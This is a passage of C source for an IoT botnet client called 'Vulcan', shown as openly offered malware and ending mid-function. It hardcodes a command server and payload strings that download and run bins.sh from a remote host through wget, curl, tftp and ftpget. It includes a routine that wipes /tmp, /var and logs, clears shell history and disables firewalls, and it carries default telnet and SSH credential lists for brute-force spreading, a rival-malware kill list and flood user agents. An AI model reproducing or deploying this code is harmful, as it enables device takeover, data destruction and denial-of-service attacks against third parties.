//  BASE Client Made by Wicked
//  SelfRep Goes Into telnet.txt (say thanks to Seclusion for that)
//  Attacks, Ranges & Botkiller Improved by Scarface
//  Decent STD Flood By Scarface
//  Improved HTTP Flood By Scarface
//  Binarys & Ranges Added By By Scarface
//  Release date 27/3/2018 - by Scarface

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>  
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>                                                      
#include <strings.h>                                                      
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>
#define VERSION "Vulcan"
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define STD_PIGZ 50
#define SOCKBUF_SIZE 1024
#define BUFFER_SIZE 1024
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
typedef uint32_t ipv4_t;

// GET BUILDS
//----------------------------------------------------------------------------------------------------------------------------------------------------------------------
char *getBuild() {
	#if defined(__x86_64__) || defined(_M_X64)
	return "x86_64";
	#elif defined(__i386) || defined(_M_IX86)
	return "x86_32";
	#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
	return "ARM-4";
	#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
	return "ARM-5"
	#elif defined(__ARM_ARCH_6_) || defined(__ARM_ARCH_6T2_)
	return "ARM-6";
	#elif defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)
	return "MIPS";
	#elif defined(__sh__)
	return "SUPERH";
	#elif defined(__powerpc) || defined(__powerpc_) || defined(_ppc_) || defined(__PPC__) || defined(_ARCH_PPC)
	return "POWERPC";
	#else
	return "UNKNOWN";
	#endif
}

void RemoveTempDirs() {
	system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
	system("rm -rf /var/log/wtmp");
	system("rm -rf ~/.bash_history");
	system("history -c;history -w");
	system("rm -rf /tmp/*");
	system("history -c");
	system("rm -rf /bin/netstat");
	system("history -w");
	system("pkill -9 busybox");
	system("pkill -9 perl");
	system("service iptables stop");
	system("/sbin/iptables -F;/sbin/iptables -X");
	system("service firewalld stop");
}
// USER AGENTS
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
const char *useragents[] = {
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
	"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
	"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
	"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
	"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
	"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
	"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
	"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
	"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
	"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
	"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
	"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
	"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
	"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
	"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
	"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
	"PSP (PlayStation Portable); 2.00",
	"Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
	"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
	"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
	"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
	"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
	"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
	"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};
struct telstate_t {
        int fd;
		uint32_t ipz;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd;
        unsigned char passwordInd;
        unsigned char tempDirInd;
uint32_t totalTimeout;
        unsigned int tTimeout;
        unsigned short bufUsed;
        char *sockbuf;
};
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint32_t scanPid;
uint32_t bcmPid;
uint32_t testmiraiPid;
uint32_t testtelnetPid;
uint32_t scanPid;
uint32_t miraiPid;
uint32_t Phonepid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
// CONFIG
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = { "167.99.94.61.28:812" };
char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.94.61.28/bins.sh; curl -O http://167.99.94.61.28/bins.sh; /bin/busybox wget http://167.99.94.61.2/bin.sh; /bin/busybox tftp 167.99.94.61.28 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 167.99.94.61.28 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 167.99.94.61.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 167.99.94.61.28 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp; rm -rf *; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh"; //Normal Payload Without busybox Implemented.
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://167.99.94.61.28/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
char *Telnet_Usernames[] = {
	"telnet\0", //telnet:telnet
	"root\0", //root:
	"root\0", //root:1234
	"admin\0", //admin:admin
    "admin\0", //admin:
	"admin\0", //admin:password
	"user\0", //user:user
};
char *Telnet_Passwords[] = {
	"telnet\0", //telnet:telnet
	"\0", //root:
	"1234\0", //root:1234
	"admin\0", //admin:admin
	"\0", //admin:
	"password\0", //admin:
	"user\0", //user:user
};
char *Mirai_Usernames[] = {
"telnet\0", //mother:fucker
"root\0", //root:xc3511
"root\0", //root:vizxv
"root\0", //root:admin
"admin\0", //admin:admin

"root\0", //root:888888
"root\0", //root:xmhdipc
"root\0", //root:default
"root\0", //root:juantech

"root\0", //root:123456
"root\0", //root:54321
"support\0", //support:support
"root\0", //root:(none)

"admin\0", //admin:password
"root\0", //root:root
"root\0", //root:12345
"user\0", //user:user

"admin\0", //admin:(none)
"root\0", //root:pass
"admin\0", //admin:admin1234
"root\0", //root:1111

"admin\0", //admin:smcadmin
"admin\0", //admin:1111
"root\0", //root:666666
"root\0", //root:password

"root\0", //root:1234
"root\0", //root:klv123
"Administrator\0", //Administrator:admin
"service\0", //service:service

"supervisor\0", //supervisor:supervisor
"guest\0", //guest:guest
"guest\0", //guest:12345
"guest\0", //guest:12345

"admin1\0", //admin1:password
"administrator\0", //administrator:1234
"666666\0", //666666:666666
"888888\0", //888888:888888
"ubnt\0", //ubnt:ubnt

"klv1234\0", //root:klv1234
"Zte521\0", //root:Zte521
"hi3518\0", //root:hi3518
"jvbzd\0", //root:jvbzd

"anko\0", //root:anko
"zlxx\0", //root:zlxx
"7ujMko0vizxv\0", //root:7ujMko0vizxv
"7ujMko0admin\0", //root:7ujMko0admin

"system\0", //root:system
"ikwb\0", //root:ikwb
"dreambox\0", //root:dreambox
"user\0", //root:user

"realtek\0", //root:realtek
"00000000\0", //root:00000000
"1111111\0", //admin:1111111
"1234\0", //admin:1234

"12345\0", //admin:12345
"54321\0", //admin:54321
"123456\0", //admin:123456
"7ujMko0admin\0", //admin:7ujMko0admin

"1234\0", //admin:1234
"pass\0", //admin:pass
"meinsm\0", //admin:meinsm
"tech\0", //tech:tech

"fucker\0", //mother:fucker
};
char *Mirai_Passwords[] = {
"telnet\0", //mother:fucker
"xc3511\0", //root:xc3511
"vizxv\0", //root:vizxv
"admin\0", //root:admin
"admin\0", //admin:admin

"888888\0", //root:888888
"xmhdipc\0", //root:xmhdipc
"default\0", //root:default
"juantech\0", //root:juantech

"123456\0", //root:123456
"54321\0", //root:54321
"support\0", //support:support
"\0", //root:(none)

"password\0", //admin:password
"root\0", //root:root
"12345\0", //root:12345
"user\0", //user:user

"\0", //admin:(none)
"pass\0", //root:pass
"admin1234\0", //admin:admin1234
"1111\0", //root:1111

"smcadmin\0", //admin:smcadmin
"1111\0", //admin:1111
"666666\0", //root:666666
"password\0", //root:password

"1234\0", //root:1234
"klv123\0", //root:klv123
"admin\0", //Administrator:admin
"service\0", //service:service

"supervisor\0", //supervisor:supervisor
"guest\0", //guest:guest
"12345\0", //guest:12345
"12345\0", //guest:12345

"password\0", //admin1:password
"1234\0", //administrator:1234
"666666\0", //666666:666666
"888888\0", //888888:888888
"ubnt\0", //ubnt:ubnt

"klv1234\0", //root:klv1234
"Zte521\0", //root:Zte521
"hi3518\0", //root:hi3518
"jvbzd\0", //root:jvbzd

"anko\0", //root:anko
"zlxx\0", //root:zlxx
"7ujMko0vizxv\0", //root:7ujMko0vizxv
"7ujMko0admin\0", //root:7ujMko0admin

"system\0", //root:system
"ikwb\0", //root:ikwb
"dreambox\0", //root:dreambox
"user\0", //root:user

"realtek\0", //root:realtek
"00000000\0", //root:00000000
"1111111\0", //admin:1111111
"1234\0", //admin:1234

"12345\0", //admin:12345
"54321\0", //admin:54321
"123456\0", //admin:123456
"7ujMko0admin\0", //admin:7ujMko0admin

"1234\0", //admin:1234
"pass\0", //admin:pass
"meinsm\0", //admin:meinsm
"tech\0", //tech:tech

"fucker\0", //mother:fucker
};
char *SSH_Usernames[] = {
	"root\0", //root:root
	"admin\0", //admin:admin
	"root\0", //root:admin
	"admin\0", //admin:1234
	"ubnt\0", //ubnt:ubnt
	"user\0", //user:user
	"ususario\0", //usuario:ususario
	"telnet\0", //telnet:telnet
	"support\0", //support:support
};
char *SSH_Passwords[] = {
	"root\0", //root:root
	"admin\0", //admin:admin
	"admin\0", //root:admin
	"1234\0", //admin:1234
	"ubnt\0", //ubnt:ubnt
	"user\0", //user:user
	"ususario\0", //usuario:ususario
	"telnet\0", //telnet:telnet
	"support\0", //support:support
};
char *Bot_Killer_Binarys[] = {
	"amsjkfbns",
	"mips",
	"xdf.mips",
	"xdf.*",
	"xdf*",
	"xdf.mipsel",
	"xdf.x86_64",
	"xdf.arm7",
	"xdf.ppc",
	"xdf.sh4",
	"mipsel", 
	"sh4", 
	"x86",
	"i686",
	"ppc",
	"i586",
	"jack*",
	"hack*",
	"arm*"
	"tel*"
	"b1",
	"b2",
	"b3",
	"b4",
	"b5",
	"b6",
	"b7",
	"b8",
	"b9",
	"wget",
	"orion",
	"lol*",
	"busybox*",
	"badbox*",
	"DFhxdhdf",
	"dvrHelper",
	"FDFDHFC",
	"FEUB",
	"FTUdftui",
	"GHfjfgvj",
	"jhUOH",
	"JIPJIPJj",
	"JIPJuipjh",
	"kmyx86_64",
	"lolmipsel",
	"mips",
	"mipsel",
	"RYrydry",
	"TwoFace*",
	"UYyuyioy",
	"x86_64",
	"XDzdfxzf",
	"xx*",
	"sh",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"10",
	"11",
	"12",
	"13",
	"14",
	"15",
	"16",
	"17",
	"18",
	"19",
	"20", 
	"busybox",
	"badbox",
	"Mirai*",
	"mirai*",
	"cunty*"
	"IoT*",
    "mips",
    "mips64",
    "mipsel",
    "sh2eb",
    "sh2elf",
    "sh4",
    "x86",
    "arm",
    "armv5",
    "armv4tl",
    "armv4",
    "armv6",
    "i686",
    "powerpc",
    "powerpc440fp",
    "i586",
    "m68k",
    "sparc",
    "x86_64",
    "jackmymips",
    "jackmymips64",
    "jackmymipsel",
    "jackmysh2eb",
    "jackmysh2elf",
    "jackmysh4",
    "jackmyx86",
    "jackmyarmv5",
    "jackmyarmv4tl",
    "jackmyarmv4",
    "jackmyarmv6",
    "jackmyi686",
    "jackmypowerpc",
    "jackmypowerpc440fp",
    "jackmyi586",
    "jackmym68k",
    "jackmysparc",
    "jackmyx86_64",
    "hackmymips",
    "hackmymips64",
    "hackmymipsel",
    "hackmysh2eb",
    "hackmysh2elf",
    "hackmysh4",
    "hackmyx86",
    "hackmyarmv5",
    "hackmyarmv4tl",
    "hackmyarmv4",
    "hackmyarmv6",
    "hackmyi686",
    "hackmypowerpc",
    "hackmypowerpc440fp",
    "hackmyi586",
    "hackmym68k",
    "hackmysparc",
    "hackmyx86_64",
    "b1",
    "b2",
    "b3",
    "b4",
    "b5",
    "b6",
    "b7",
    "b8",
    "b9",
    "b10",
    "b11",
    "b12",
    "b13",
    "b14",
    "b15",
    "b16",
    "b17",
    "b18",
    "b19",
    "b20",
    "busyboxterrorist",
    "DFhxdhdf",
    "dvrHelper",
    "FDFDHFC",
    "FEUB",
    "FTUdftui",
    "GHfjfgvj",
    "jhUOH",
    "JIPJIPJj",
    "JIPJuipjh",
    "kmymips",
    "kmymips64",
    "kmymipsel",
    "kmysh2eb",
    "kmysh2elf",
    "kmysh4",
    "kmyx86",
    "kmyarmv5",
    "kmyarmv4tl",
    "kmyarmv4",
    "kmyarmv6",
    "kmyi686",
    "kmypowerpc",
    "kmypowerpc440fp",
    "kmyi586",
    "kmym68k",
    "kmysparc",
    "kmyx86_64",
    "lolmips",
    "lolmips64",
    "lolmipsel",
    "lolsh2eb",
    "lolsh2elf",
    "lolsh4",
    "lolx86",
    "lolarmv5",
    "lolarmv4tl",
    "lolarmv4",
    "lolarmv6",
    "loli686",
	"mirai.linux",
	"mirai.mips",
	"mirai*",
    "lolpowerpc",
    "lolpowerpc440fp",
    "loli586",
    "lolm68k",
    "lolsparc",
    "RYrydry",
    "telmips",
    "telmips64",
    "telmipsel",
    "telsh2eb",
    "telsh2elf",
    "telsh4",
    "telx86",
    "telarmv5",
    "telarmv4tl",
    "telarmv4",
    "telarmv6",
    "teli686",
    "telpowerpc",
    "telpowerpc440fp",
    "teli586",
    "telm68k",
    "telsparc",
    "telx86_64",
    "TwoFacemips",
    "TwoFacemips64",
    "TwoFacemipsel",
    "TwoFacesh2eb",
    "TwoFacesh2elf",
    "TwoFacesh4",
    "TwoFacex86",
    "TwoFacearmv5",
    "TwoFacearmv4tl",
    "TwoFacearmv4",
    "TwoFacearmv6",
    "TwoFacei686",
    "TwoFacepowerpc",
    "TwoFacepowerpc440fp",
    "TwoFacei586",
    "TwoFacem68k",
    "TwoFacesparc",
    "TwoFacex86_64",
    "UYyuyioy",
    "XDzdfxzf",
    "xxb1",
    "xxb2",
    "xxb3",
    "xxb4",
    "xxb5",
    "xxb6",
    "xxb7",
    "xxb8",
    "xxb9",
    "xxb10",
    "xxb11",
    "xxb12",
    "xxb13",
    "xxb14",
    "xxb15",
    "xxb16",
    "xxb17",
    "xxb18",
    "xxb19",
    "xxb20",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "bb",
    "busybotnet",
    "pppd",
    "pppoe",
    "wput",
    "B1",
    "B2",
    "B3",
    "B4",
    "B5",
    "B6",
    "B7",
    "B8",
    "B9",
    "B10",
    "B11",
    "B12",
    "B13",
    "B14",
    "B15",
    "B16",
    "B17",
    "B18",
    "B20",
	"DVR",
	"*mirai",
	"*.mirai",
	"cunty*",
	"IoT*",
	"mips64",
	"sh4",
	"arm",
	"armv5",
	"armv4tl",
	"armv4",
	"armv6",
	"powerpc",
	"powerpc440fp",
	"pc",
	"m68k",
	"sparc",
	"mirai.mips",
	"orion.mips",
	"okiru.mips",
	"nightcore.mips",
	"ar",
	"lsp.modz",
	"mipsxd",
	"die.mips",
	"dupessh"
	"*mips",
	"*.mips",
	"pps",
	"sh4*",
	"wget*",
	"ssh*",
	"vulcan", 
	"jennifer*",
	"okiru*",
	"vulcana",
	"vulcanb", 
	"vulcand",
	"vulcane",
	"vulcanx",
	"vulcany",
	"vulcanz", 
	"vulcang",
	"apache2",
	"telnetd"
};

char *Temp_Directorys[] = {"/tmp/*", "/root/tmp/*", "/temp/*", "/var/*", "/var/run/*", "/var/tmp/*",  (char*) 0};
char *advances[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0}; 																					
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0}; 														
char *successes[] = {"busybox", "$", "#", "shell", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0}; 																									
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};			
// END OF CONFIG STOP EDITING FROM HERE
// //--------------------------------------------------------------------------------------------------------------------------------------------------------------------		
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
